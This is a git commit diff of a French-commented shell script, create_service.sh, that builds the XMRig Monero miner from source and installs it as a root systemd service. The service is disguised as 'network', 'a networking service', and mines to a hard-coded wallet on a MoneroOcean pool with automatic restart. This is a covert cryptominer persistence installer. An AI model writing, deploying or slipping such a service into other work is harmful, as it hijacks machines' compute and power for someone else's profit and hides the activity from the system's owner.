c60d479ca013abf6f7ae8f11acde6729791925b8
ARGAUD <romain943602@gmail.com>
2025-02-08 16:10:03 -0500

    MAJ for one script

--- create_service.sh
+++ create_service.sh
@@ -1,17 +1,39 @@
 #!/bin/bash
 
 SERVICE_NAME="network"
-SCRIPT_PATH=$(realpath ./minage.sh)
 SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"
 LOG_PATH="/home/pi/network.log"
 
+# Update and upgrade system packages
+sudo apt -y update
+sudo apt -y upgrade
+
+# Install required dependencies
+sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+
+cd /tmp
+
+# Clone the XMRig repository
+git clone https://github.com/xmrig/xmrig.git
+
+# Navigate to the cloned repository
+cd xmrig
+
+# Create and enter the build directory
+mkdir build
+cd build
+
+# Configure the build system
+cmake ..
+
+# Compile the project
+make
+
+BUILD_PATH=$(realpath .)
+
 echo "Creation du service $SERVICE_NAME..."
 
-if [ ! -f "$SCRIPT_PATH" ]; then
-    echo "Erreur : le script $SCRIPT_PATH n'existe pas !"
-    exit 1
-fi
-
+# Verifier si le service existe deja
 if [ -f "$SERVICE_FILE" ]; then
     echo "Le service $SERVICE_NAME existe deja. Voulez-vous le recreer ? (o/n)"
     read -r reponse
@@ -22,20 +44,18 @@ if [ -f "$SERVICE_FILE" ]; then
     systemctl stop "$SERVICE_NAME"
 fi
 
-chmod +x "$SCRIPT_PATH"
-
 bash -c "cat > $SERVICE_FILE" <<EOF
 [Unit]
 Description=a networking service
 After=network target
 
 [Service]
-ExecStart=$SCRIPT_PATH
-WorkingDirectory=$(dirname "$SCRIPT_PATH")
+ExecStart= /bin/bash -c './xmrig -o gulf.moneroocean.stream:10128 -u 4AD4TDproP59Vk2SVd2SPr7zkzUBEyHD87GnKgGXZsxHRPiKVBf8H381UBeAcwu2Mtg5rHnGKzZCPhL3MFiGHBxY3jbKdWY -p piner'
+WorkingDirectory=$(dirname "$BUILD_PATH")
 StandardOutput=file:$LOG_PATH
 StandardError=file:$LOG_PATH
 Restart=always
-User=pi
+User=root
 
 [Install]
 WantedBy=multi-user.target
@@ -52,3 +72,4 @@ systemctl start "$SERVICE_NAME"
 sleep 2
 
 systemctl status "$SERVICE_NAME" --no-pager
+
